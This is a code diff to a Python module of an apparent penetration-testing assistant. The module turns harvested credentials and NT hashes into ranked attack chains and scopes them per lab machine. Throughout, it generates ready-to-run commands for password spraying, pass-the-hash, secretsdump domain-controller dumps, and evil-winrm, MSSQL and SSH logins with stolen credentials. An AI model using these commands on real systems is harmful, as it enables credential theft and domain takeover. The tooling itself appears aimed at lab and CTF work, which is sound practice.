@@ -11,7 +11,7 @@ steps are confined to lab_only chains, capped at MEDIUM, never a top action, and
 always carry the [LAB-ONLY] tag.
 """
 import re
-from analyzers import compliance
+from analyzers import compliance, filters
 from analyzers.ingest.evidence import Evidence
 
 LAB = compliance.LAB_ONLY_TAG
@@ -30,14 +30,15 @@ _RX = {
 
 class Chain:
     __slots__ = ("rule", "label", "summary", "crit", "conf", "ready", "prox",
-                 "commands", "lab_only", "src", "line")
+                 "commands", "lab_only", "src", "line", "count")
 
     def __init__(self, rule, label, summary, crit, conf, ready, prox,
-                 commands, lab_only=False, src="?", line=None):
+                 commands, lab_only=False, src="?", line=None, count=1):
         self.rule, self.label, self.summary = rule, label, summary
         self.crit, self.conf, self.ready, self.prox = crit, conf, ready, prox
         self.commands, self.lab_only = commands, lab_only
         self.src, self.line = src, line
+        self.count = count          # how many findings this one chain represents
 
     @property
     def score(self):
@@ -90,10 +91,15 @@ def _entities(report, store):
             mdn = _RX["default_nt"].search(d)
             if mdn:
                 e.defaults.append((mdn.group(1), src)); _add_cred(e, "", mdn.group(1), src, ln)
-            elif "NTLM" in d:
-                mh = _RX["nt"].search(d)
-                if mh:
-                    e.nt[mh.group(1).lower()] = (None, src, ln)
+            elif "NTLM" in d and "blank" not in d.lower():
+                # user-bound form "NTLM (NT) <user>: <hash>" (from pwdump rows)
+                mb = re.search(r'NTLM \(NT\)\s*([^\s:]+)\s*:\s*([a-f0-9]{32})', d)
+                if mb and not filters.is_blank_hash(mb.group(2)):
+                    e.nt[mb.group(2).lower()] = (mb.group(1), src, ln)
+                elif not mb:
+                    mh = re.search(r'\b([a-f0-9]{32})\b', d)
+                    if mh and not filters.is_blank_hash(mh.group(1)):
+                        e.nt[mh.group(1).lower()] = (None, src, ln)
             if d.startswith(("sha512crypt", "md5crypt", "sha256crypt", "bcrypt", "yescrypt")):
                 e.has_shadow = True; e.shadow_src = e.shadow_src or (src, ln)
             if d.startswith("Kerberoast TGS"):
@@ -123,7 +129,7 @@ def _entities(report, store):
             _add_cred(e, ev.user, ev.plaintext, ev.source, ev.line)
         elif ev.kind == "cred" and ev.cred:
             _add_cred(e, ev.user, ev.cred, ev.source, ev.line)
-        elif ev.kind == "hash" and ev.hash:
+        elif ev.kind == "hash" and ev.hash and not filters.is_blank_hash(ev.hash):
             e.nt[ev.hash.lower()] = (ev.user, ev.source, ev.line)
         if ev.user:
             e.users.add(ev.user)
@@ -138,68 +144,106 @@ def _userlist(e):
     return "users.txt" if len({u.lower() for u in e.users}) > 1 else None
 
 
+def _machine(src, root):
+    """top-level loot dir (per-box scope), e.g. 'forest' from htb/forest/notes."""
+    import os
+    if not src or src.startswith(("<", "bloodhound")):
+        return ""
+    try:
+        rel = os.path.relpath(src, root)
+    except ValueError:
+        rel = src
+    parts = rel.split(os.sep)
+    return parts[0] if parts and parts[0] not in (".", "..") else ""
+
+
 def run(report, store, ui=None):
     import os
     e = _entities(report, store)
+    root = getattr(report, "root", ".")
 
-    def host(svc, fallback="<target>"):
-        hs = store.hosts_with_service({svc})
-        if not hs:
-            return fallback
-        dcs = [h for h in hs if any(x.fact == "dc" and x.host == h
-                                    for x in store.by_kind("host"))]
-        return (dcs or hs)[0]
+    # per-machine service / DC maps (so a cred on box A never chains to box B)
+    mach_svc, mach_dc = {}, {}
+    for ev in store.by_kind("service"):
+        if ev.host and ev.service:
+            mach_svc.setdefault(_machine(ev.source, root), {}).setdefault(ev.service, ev.host)
+    global_dc = ""
+    for x in store.by_kind("host"):
+        if x.fact == "dc" and x.host:
+            mach_dc.setdefault(_machine(x.source, root), x.host)
+            global_dc = global_dc or x.host
 
-    def dc(fallback="<DC-IP>"):
-        for x in store.by_kind("host"):
-            if x.fact == "dc":
-                return x.host
-        hs = store.hosts_with_service({"smb"}) or store.hosts_with_service({"kerberos"})
-        return hs[0] if hs else fallback
+    def svc_on(mach, svc):
+        return mach_svc.get(mach, {}).get(svc)
+
+    def dc_for(mach):
+        return mach_dc.get(mach) or svc_on(mach, "smb") or global_dc or "<DC-IP>"
 
     chains = []
     ul = _userlist(e)
 
-    # consolidated spray-candidate plaintexts
+    # ── plaintext creds: spray + (only same-machine) service shells ──
     for (ulc, pw), (disp, src, ln) in e.creds.items():
+        mach = _machine(src, root)
+        smb = svc_on(mach, "smb") or dc_for(mach)
         utoken = ul or f"'{disp}'"
-        smb = host("smb", dc())
         chains.append(Chain("R1", "spray", f"reuse {disp}:{pw} across hosts",
             crit=8, conf=0.8, ready=1.5, prox=_prox(store, smb),
             commands=[f"netexec smb {smb} -u {utoken} -p '{pw}' --continue-on-success" +
                       ("" if utoken == "users.txt" else " -k"),
                       f"impacket-secretsdump '{disp}':'{pw}'@{smb} -just-dc   # if (Pwn3d!)"],
             src=src, line=ln))
-        if store.hosts_with_service({"winrm"}):
-            wh = host("winrm")
-            chains.append(Chain("R3", "winrm shell", f"{disp} -> WinRM on {wh}",
+        wh = svc_on(mach, "winrm")
+        if wh:
+            chains.append(Chain("R3", "winrm shell", f"{disp} -> WinRM {wh}",
                 crit=7, conf=0.8, ready=1.5, prox=_prox(store, wh),
                 commands=[f"evil-winrm -i {wh} -u '{disp}' -p '{pw}'"], src=src, line=ln))
-        if store.hosts_with_service({"mssql"}):
-            mh = host("mssql")
-            chains.append(Chain("R4", "mssql", f"{disp} -> MSSQL on {mh}",
+        mh = svc_on(mach, "mssql")
+        if mh:
+            chains.append(Chain("R4", "mssql", f"{disp} -> MSSQL {mh}",
                 crit=6, conf=0.7, ready=1.5, prox=_prox(store, mh),
                 commands=[f"impacket-mssqlclient '{disp}':'{pw}'@{mh} -windows-auth"], src=src, line=ln))
-        if store.hosts_with_service({"ssh"}):
-            sh = host("ssh")
-            chains.append(Chain("R5", "ssh", f"{disp} -> SSH on {sh}",
+        sh = svc_on(mach, "ssh")
+        if sh:
+            chains.append(Chain("R5", "ssh", f"{disp} -> SSH {sh}",
                 crit=6, conf=0.6, ready=1.4, prox=_prox(store, sh),
                 commands=[f"ssh '{disp}'@{sh}    # password: {pw}"], src=src, line=ln))
 
-    # NT hash -> PtH
+    # ── NT hashes: AGGREGATE per target (one rolled-up PtH chain, not 1/hash) ──
+    by_target = {}
     for h, (huser, src, ln) in e.nt.items():
-        u = huser or "<user>"
-        smb = host("smb", dc())
-        chains.append(Chain("R7", "pass-the-hash", f"PtH {u} -> {smb}",
-            crit=10, conf=0.85, ready=1.5, prox=_prox(store, smb),
-            commands=[f"netexec smb {smb} -u '{u}' -H {h}",
-                      f"impacket-secretsdump -hashes :{h} <DOMAIN>/'{u}'@{smb} -just-dc   # if (Pwn3d!)"],
-            src=src, line=ln))
-        if store.hosts_with_service({"winrm"}):
-            wh = host("winrm")
-            chains.append(Chain("R8", "PtH winrm", f"PtH {u} -> WinRM {wh}",
+        mach = _machine(src, root)
+        tgt = svc_on(mach, "smb") or dc_for(mach)
+        by_target.setdefault(tgt, []).append((h, huser, src, ln))
+    for tgt, items in by_target.items():
+        h0, u0, src0, ln0 = items[0]
+        u = u0 or "<user>"
+        n = len(items)
+        more = f"   # +{n - 1} more NT hashes here - loop the rest (see PASSWORD HASHES)" if n > 1 else ""
+        chains.append(Chain("R7", "pass-the-hash", f"PtH -> {tgt}" + (f"  x{n} hashes" if n > 1 else f" ({u})"),
+            crit=10, conf=0.85, ready=1.5, prox=_prox(store, tgt),
+            commands=[f"netexec smb {tgt} -u '{u}' -H {h0}{more}",
+                      f"impacket-secretsdump -hashes :{h0} <DOMAIN>/'{u}'@{tgt} -just-dc   # if (Pwn3d!)"],
+            src=src0, line=ln0, count=n))
+        # winrm PtH only when that machine actually exposes winrm
+        wh = None
+        for _h, _u, _s, _l in items:
+            wh = svc_on(_machine(_s, root), "winrm")
+            if wh:
+                break
+        if wh:
+            chains.append(Chain("R8", "PtH winrm", f"PtH -> WinRM {wh}",
                 crit=8, conf=0.8, ready=1.5, prox=_prox(store, wh),
-                commands=[f"evil-winrm -i {wh} -u '{u}' -H {h}"], src=src, line=ln))
+                commands=[f"evil-winrm -i {wh} -u '{u}' -H {h0}"], src=src0, line=ln0, count=n))
+
+    def host(svc, fallback="<target>"):     # legacy helper used by rules below
+        for m in mach_svc:
+            if svc in mach_svc[m]:
+                return mach_svc[m][svc]
+        return fallback
+
+    def dc(fallback="<DC-IP>"):
+        return global_dc or fallback
 
     # default creds -> log in directly
     for label, src in e.defaults:
@@ -276,6 +320,16 @@ def run(report, store, ui=None):
                 commands=["impacket-secretsdump -sam SAM -system SYSTEM" +
                           (" -security SECURITY" if "security" in hives else "") + " LOCAL"],
                 src=os.path.join(d, "SAM")))
+
+    # ── dedup identical chains across files (keep best score, sum counts) ──
+    by_key = {}
+    for c in chains:
+        k = (c.rule, c.summary)
+        if k in by_key:
+            by_key[k].count += c.count
+        else:
+            by_key[k] = c
+    chains = list(by_key.values())
 
     # ── compliance gate: tag lab-only, drop anything non-compliant ──
     clean = []
